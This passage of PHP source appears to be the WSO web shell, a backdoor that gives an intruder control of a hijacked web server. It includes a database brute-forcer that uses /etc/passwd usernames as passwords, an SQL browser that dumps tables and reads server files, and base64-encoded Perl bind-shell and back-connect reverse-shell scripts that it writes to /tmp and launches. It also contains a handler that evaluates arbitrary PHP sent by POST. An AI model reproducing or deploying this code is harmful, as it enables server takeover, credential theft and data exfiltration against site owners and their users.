 959                                                                 function bruteForce($ip, $port, $login, $pass) {
 960                                                                     $str = "host='" . $ip . "' port='" . $port . "' user='" . $login . "' password='" . $pass . "' dbname=postgres";
 961                                                                     $res = @pg_connect($str);
 962                                                                     @pg_close($res);
 963                                                                     return $res;
 964                                                                 }
 965                                                             }
 966                                                             $success = 0;
 967                                                             $attempts = 0;
 968                                                             $server = explode(":", $_POST['server']);
 969                                                             if ($_POST['type'] == 1) {
 970                                                                 $temp = @file('/etc/passwd');
 971                                                                 if (is_array($temp)) foreach ($temp as $line) {
 972                                                                     $line = explode(":", $line);
 973                                                                     ++$attempts;
 974                                                                     if (bruteForce(@$server[0], @$server[1], $line[0], $line[0])) {
 975                                                                         $success++;
 976                                                                         echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . '<br>';
 977                                                                     }
 978                                                                     if (@$_POST['reverse']) {
 979                                                                         $tmp = "";
 980                                                                         for ($i = strlen($line[0]) - 1;$i >= 0;--$i) $tmp.= $line[0][$i];
 981                                                                         ++$attempts;
 982                                                                         if (bruteForce(@$server[0], @$server[1], $line[0], $tmp)) {
 983                                                                             $success++;
 984                                                                             echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($tmp);
 985                                                                         }
 986                                                                     }
 987                                                                 }
 988                                                             } elseif ($_POST['type'] == 2) {
 989                                                                 $temp = @file($_POST['dict']);
 990                                                                 if (is_array($temp)) foreach ($temp as $line) {
 991                                                                     $line = trim($line);
 992                                                                     ++$attempts;
 993                                                                     if (bruteForce($server[0], @$server[1], $_POST['login'], $line)) {
 994                                                                         $success++;
 995                                                                         echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($line) . '<br>';
 996                                                                     }
 997                                                                 }
 998                                                             }
 999                                                             echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
1000                                                         }
1001                                                         echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="' . htmlspecialchars($GLOBALS['cwd']) . 'passwd.dic"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
1002                                                         echo '</div><br>';
1003                                                         wsoFooter();
1004                                                     }
1005                                                     function actionSql() {
1006                                                         class DbClass {
1007                                                             var $type;
1008                                                             var $link;
1009                                                             var $res;
1010                                                             function DbClass($type) {
1011                                                                 $this->type = $type;
1012                                                             }
1013                                                             function connect($host, $user, $pass, $dbname) {
1014                                                                 switch ($this->type) {
1015                                                                     case 'mysql':
1016                                                                         if ($this->link = @mysql_connect($host, $user, $pass, true)) return true;
1017                                                                         break;
1018                                                                     case 'pgsql':
1019                                                                         $host = explode(':', $host);
1020                                                                         if (!$host[1]) $host[1] = 5432;
1021                                                                         if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) return true;
1022                                                                         break;
1023                                                                     }
1024                                                                     return false;
1025                                                                 }
1026                                                                 function selectdb($db) {
1027                                                                     switch ($this->type) {
1028                                                                         case 'mysql':
1029                                                                             if (@mysql_select_db($db)) return true;
1030                                                                             break;
1031                                                                         }
1032                                                                         return false;
1033                                                                 }
1034                                                                 function query($str) {
1035                                                                     switch ($this->type) {
1036                                                                         case 'mysql':
1037                                                                             return $this->res = @mysql_query($str);
1038                                                                         break;
1039                                                                         case 'pgsql':
1040                                                                             return $this->res = @pg_query($this->link, $str);
1041                                                                         break;
1042                                                                     }
1043                                                                     return false;
1044                                                                 }
1045                                                                 function fetch() {
1046                                                                     $res = func_num_args() ? func_get_arg(0) : $this->res;
1047                                                                     switch ($this->type) {
1048                                                                         case 'mysql':
1049                                                                             return @mysql_fetch_assoc($res);
1050                                                                         break;
1051                                                                         case 'pgsql':
1052                                                                             return @pg_fetch_assoc($res);
1053                                                                         break;
1054                                                                     }
1055                                                                     return false;
1056                                                                 }
1057                                                                 function listDbs() {
1058                                                                     switch ($this->type) {
1059                                                                         case 'mysql':
1060                                                                             return $this->query("SHOW databases");
1061                                                                         break;
1062                                                                         case 'pgsql':
1063                                                                             return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
1064                                                                         break;
1065                                                                     }
1066                                                                     return false;
1067                                                                 }
1068                                                                 function listTables() {
1069                                                                     switch ($this->type) {
1070                                                                         case 'mysql':
1071                                                                             return $this->res = $this->query('SHOW TABLES');
1072                                                                         break;
1073                                                                         case 'pgsql':
1074                                                                             return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
1075                                                                         break;
1076                                                                     }
1077                                                                     return false;
1078                                                                 }
1079                                                                 function error() {
1080                                                                     switch ($this->type) {
1081                                                                         case 'mysql':
1082                                                                             return @mysql_error();
1083                                                                         break;
1084                                                                         case 'pgsql':
1085                                                                             return @pg_last_error();
1086                                                                         break;
1087                                                                     }
1088                                                                     return false;
1089                                                                 }
1090                                                                 function setCharset($str) {
1091                                                                     switch ($this->type) {
1092                                                                         case 'mysql':
1093                                                                             if (function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this->link);
1094                                                                             else $this->query('SET CHARSET ' . $str);
1095                                                                             break;
1096                                                                         case 'pgsql':
1097                                                                             return @pg_set_client_encoding($this->link, $str);
1098                                                                             break;
1099                                                                         }
1100                                                                         return false;
1101                                                                     }
1102                                                                     function loadFile($str) {
1103                                                                         switch ($this->type) {
1104                                                                             case 'mysql':
1105                                                                                 return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
1106                                                                             break;
1107                                                                             case 'pgsql':
1108                                                                                 $this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '" . addslashes($str) . "';select file from wso2;");
1109                                                                                 $r = array();
1110                                                                                 while ($i = $this->fetch()) $r[] = $i['file'];
1111                                                                                 $this->query('drop table wso2');
1112                                                                                 return array('file' => implode("
1113 ", $r));
1114                                                                                 break;
1115                                                                             }
1116                                                                             return false;
1117                                                                     }
1118                                                                     function dump($table, $fp = false) {
1119                                                                         switch ($this->type) {
1120                                                                             case 'mysql':
1121                                                                                 $res = $this->query('SHOW CREATE TABLE `' . $table . '`');
1122                                                                                 $create = mysql_fetch_array($res);
1123                                                                                 $sql = $create[1] . ";
1124 ";
1125                                                                                 if ($fp) fwrite($fp, $sql);
1126                                                                                 else echo ($sql);
1127                                                                                 $this->query('SELECT * FROM `' . $table . '`');
1128                                                                                 $head = true;
1129                                                                                 while ($item = $this->fetch()) {
1130                                                                                     $columns = array();
1131                                                                                     foreach ($item as $k => $v) {
1132                                                                                         if ($v == null) $item[$k] = "NULL";
1133                                                                                         elseif (is_numeric($v)) $item[$k] = $v;
1134                                                                                         else $item[$k] = "'" . @mysql_real_escape_string($v) . "'";
1135                                                                                         $columns[] = "`" . $k . "`";
1136                                                                                     }
1137                                                                                     if ($head) {
1138                                                                                         $sql = 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES 
1139   (" . implode(", ", $item) . ')';
1140                                                                                         $head = false;
1141                                                                                     } else $sql = "
1142   ,(" . implode(", ", $item) . ')';
1143                                                                                     if ($fp) fwrite($fp, $sql);
1144                                                                                     else echo ($sql);
1145                                                                                 }
1146                                                                                 if (!$head) if ($fp) fwrite($fp, ";
1147 
1148 ");
1149                                                                                 else echo (";
1150 
1151 ");
1152                                                                                 break;
1153                                                                             case 'pgsql':
1154                                                                                 $this->query('SELECT * FROM ' . $table);
1155                                                                                 while ($item = $this->fetch()) {
1156                                                                                     $columns = array();
1157                                                                                     foreach ($item as $k => $v) {
1158                                                                                         $item[$k] = "'" . addslashes($v) . "'";
1159                                                                                         $columns[] = $k;
1160                                                                                     }
1161                                                                                     $sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $item) . ');' . "
1162 ";
1163                                                                                     if ($fp) fwrite($fp, $sql);
1164                                                                                     else echo ($sql);
1165                                                                                 }
1166                                                                                 break;
1167                                                                             }
1168                                                                             return false;
1169                                                                         }
1170                                                                     };
1171                                                                     $db = new DbClass($_POST['type']);
1172                                                                     if (@$_POST['p2'] == 'download') {
1173                                                                         $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
1174                                                                         $db->selectdb($_POST['sql_base']);
1175                                                                         switch ($_POST['charset']) {
1176                                                                             case "Windows-1251":
1177                                                                                 $db->setCharset('cp1251');
1178                                                                             break;
1179                                                                             case "UTF-8":
1180                                                                                 $db->setCharset('utf8');
1181                                                                             break;
1182                                                                             case "KOI8-R":
1183                                                                                 $db->setCharset('koi8r');
1184                                                                             break;
1185                                                                             case "KOI8-U":
1186                                                                                 $db->setCharset('koi8u');
1187                                                                             break;
1188                                                                             case "cp866":
1189                                                                                 $db->setCharset('cp866');
1190                                                                             break;
1191                                                                         }
1192                                                                         if (empty($_POST['file'])) {
1193                                                                             ob_start("ob_gzhandler", 4096);
1194                                                                             header("Content-Disposition: attachment; filename=dump.sql");
1195                                                                             header("Content-Type: text/plain");
1196                                                                             foreach ($_POST['tbl'] as $v) $db->dump($v);
1197                                                                             exit;
1198                                                                         } elseif ($fp = @fopen($_POST['file'], 'w')) {
1199                                                                             foreach ($_POST['tbl'] as $v) $db->dump($v, $fp);
1200                                                                             fclose($fp);
1201                                                                             unset($_POST['p2']);
1202                                                                         } else die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
1203                                                                     }
1204                                                                     wsoHeader();
1205                                                                     echo "
1206 <h1>Sql browser</h1><div class=content>
1207 <form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
1208 <td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
1209 <input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
1210 <td><select name='type'><option value='mysql' ";
1211                                                                     if (@$_POST['type'] == 'mysql') echo 'selected';
1212                                                                     echo ">MySql</option><option value='pgsql' ";
1213                                                                     if (@$_POST['type'] == 'pgsql') echo 'selected';
1214                                                                     echo ">PostgreSql</option></select></td>
1215 <td><input type=text name=sql_host value='" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "'></td>
1216 <td><input type=text name=sql_login value='" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "'></td>
1217 <td><input type=text name=sql_pass value='" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "'></td><td>";
1218                                                                     $tmp = "<input type=text name=sql_base value=''>";
1219                                                                     if (isset($_POST['sql_host'])) {
1220                                                                         if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
1221                                                                             switch ($_POST['charset']) {
1222                                                                                 case "Windows-1251":
1223                                                                                     $db->setCharset('cp1251');
1224                                                                                 break;
1225                                                                                 case "UTF-8":
1226                                                                                     $db->setCharset('utf8');
1227                                                                                 break;
1228                                                                                 case "KOI8-R":
1229                                                                                     $db->setCharset('koi8r');
1230                                                                                 break;
1231                                                                                 case "KOI8-U":
1232                                                                                     $db->setCharset('koi8u');
1233                                                                                 break;
1234                                                                                 case "cp866":
1235                                                                                     $db->setCharset('cp866');
1236                                                                                 break;
1237                                                                             }
1238                                                                             $db->listDbs();
1239                                                                             echo "<select name=sql_base><option value=''></option>";
1240                                                                             while ($item = $db->fetch()) {
1241                                                                                 list($key, $value) = each($item);
1242                                                                                 echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
1243                                                                             }
1244                                                                             echo '</select>';
1245                                                                         } else echo $tmp;
1246                                                                     } else echo $tmp;
1247                                                                     echo "</td>
1248               <td><input type=submit value='>>' onclick='fs(d.sf);'></td>
1249                 <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "> count the number of rows</td>
1250           </tr>
1251       </table>
1252       <script>
1253             s_db='" . @addslashes($_POST['sql_base']) . "';
1254             function fs(f) {
1255                 if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
1256                     if(f.p1) f.p1.value='';
1257                     if(f.p2) f.p2.value='';
1258                     if(f.p3) f.p3.value='';
1259                 }
1260             }
1261           function st(t,l) {
1262               d.sf.p1.value = 'select';
1263               d.sf.p2.value = t;
1264                 if(l && d.sf.p3) d.sf.p3.value = l;
1265               d.sf.submit();
1266           }
1267           function is() {
1268               for(i=0;i<d.sf.elements['tbl[]'].length;++i)
1269                   d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
1270           }
1271       </script>";
1272                                                                     if (isset($db) && $db->link) {
1273                                                                         echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
1274                                                                         if (!empty($_POST['sql_base'])) {
1275                                                                             $db->selectdb($_POST['sql_base']);
1276                                                                             echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
1277                                                                             $tbls_res = $db->listTables();
1278                                                                             while ($item = $db->fetch($tbls_res)) {
1279                                                                                 list($key, $value) = each($item);
1280                                                                                 if (!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
1281                                                                                 $value = htmlspecialchars($value);
1282                                                                                 echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>";
1283                                                                             }
1284                                                                             echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
1285                                                                             if (@$_POST['p1'] == 'select') {
1286                                                                                 $_POST['p1'] = 'query';
1287                                                                                 $_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;
1288                                                                                 $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
1289                                                                                 $num = $db->fetch();
1290                                                                                 $pages = ceil($num['n'] / 30);
1291                                                                                 echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>" . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
1292                                                                                 echo " of $pages";
1293                                                                                 if ($_POST['p3'] > 1) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'>< Prev</a>";
1294                                                                                 if ($_POST['p3'] < $pages) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'>Next ></a>";
1295                                                                                 $_POST['p3']--;
1296                                                                                 if ($_POST['type'] == 'pgsql') $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . ($_POST['p3'] * 30);
1297                                                                                 else $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . ($_POST['p3'] * 30) . ',30';
1298                                                                                 echo "<br><br>";
1299                                                                             }
1300                                                                             if ((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
1301                                                                                 $db->query(@$_POST['p2']);
1302                                                                                 if ($db->res !== false) {
1303                                                                                     $title = false;
1304                                                                                     echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
1305                                                                                     $line = 1;
1306                                                                                     while ($item = $db->fetch()) {
1307                                                                                         if (!$title) {
1308                                                                                             echo '<tr>';
1309                                                                                             foreach ($item as $key => $value) echo '<th>' . $key . '</th>';
1310                                                                                             reset($item);
1311                                                                                             $title = true;
1312                                                                                             echo '</tr><tr>';
1313                                                                                             $line = 2;
1314                                                                                         }
1315                                                                                         echo '<tr class="l' . $line . '">';
1316                                                                                         $line = $line == 1 ? 2 : 1;
1317                                                                                         foreach ($item as $key => $value) {
1318                                                                                             if ($value == null) echo '<td><i>null</i></td>';
1319                                                                                             else echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
1320                                                                                         }
1321                                                                                         echo '</tr>';
1322                                                                                     }
1323                                                                                     echo '</table>';
1324                                                                                 } else {
1325                                                                                     echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
1326                                                                                 }
1327                                                                             }
1328                                                                             echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
1329                                                                             if (!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) echo htmlspecialchars($_POST['p2']);
1330                                                                             echo "</textarea><br/><input type=submit value='Execute'>";
1331                                                                             echo "</td></tr>";
1332                                                                         }
1333                                                                         echo "</table></form><br/>";
1334                                                                         if ($_POST['type'] == 'mysql') {
1335                                                                             $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
1336                                                                             if ($db->fetch()) echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
1337                                                                         }
1338                                                                         if (@$_POST['p1'] == 'loadfile') {
1339                                                                             $file = $db->loadFile($_POST['p2']);
1340                                                                             echo '<pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
1341                                                                         }
1342                                                                     } else {
1343                                                                         echo htmlspecialchars($db->error());
1344                                                                     }
1345                                                                     echo '</div>';
1346                                                                     wsoFooter();
1347                                                                 }
1348                                                                 function actionNetwork() {
1349                                                                     wsoHeader();
1350                                                                     $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
1351                                                                     $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
1352                                                                     echo "<h1>Network tools</h1><div class=content>
1353   <form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
1354   <span>Bind port to /bin/sh 1</span><br/>
1355   Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
1356   </form>
1357   <form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
1358   <span>Back-connect  1</span><br/>
1359   Server: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
1360   </form><br>";
1361                                                                     if (isset($_POST['p1'])) {
1362                                                                         function cf($f, $t) {
1363                                                                             $w = @fopen($f, "w") or @function_exists('file_put_contents');
1364                                                                             if ($w) {
1365                                                                                 @fwrite($w, base64_decode($t));
1366                                                                                 @fclose($w);
1367                                                                             }
1368                                                                         }
1369                                                                         if ($_POST['p1'] == 'bpp') {
1370                                                                             cf("/tmp/bp.pl", $bind_port_p);
1371                                                                             $out = wsoEx("perl /tmp/bp.pl " . $_POST['p2'] . " 1>/dev/null 2>&1 &");
1372                                                                             echo "<pre class=ml1>$out
1373 " . wsoEx("ps aux | grep bp.pl") . "</pre>";
1374                                                                             unlink("/tmp/bp.pl");
1375                                                                         }
1376                                                                         if ($_POST['p1'] == 'bcp') {
1377                                                                             cf("/tmp/bc.pl", $back_connect_p);
1378                                                                             $out = wsoEx("perl /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " 1>/dev/null 2>&1 &");
1379                                                                             echo "<pre class=ml1>$out
1380 " . wsoEx("ps aux | grep bc.pl") . "</pre>";
1381                                                                             unlink("/tmp/bc.pl");
1382                                                                         }
1383                                                                     }
1384                                                                     echo '</div>';
1385                                                                     wsoFooter();
1386                                                                 }
1387                                                                 function actionRC() {
1388                                                                     if (!@$_POST['p1']) {
1389                                                                         $a = array("uname" => php_uname(), "php_version" => phpversion(), "wso_version" => WSO_VERSION, "safemode" => @ini_get('safe_mode'));
1390                                                                         echo serialize($a);
1391                                                                     } else {
1392                                                                         eval($_POST['p1']);
1393                                                                     }
1394                                                                 }
1395                                                                 if (empty($_POST['a'])) if (isset($default_action) && function_exists('action' . $default_action)) $_POST['a'] = $default_action;
1396                                                                 else $_POST['a'] = 'SecInfo';
1397                                                                 if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) call_user_func('action' . $_POST['a']);
1398                                                                 exit;
1399 ?>
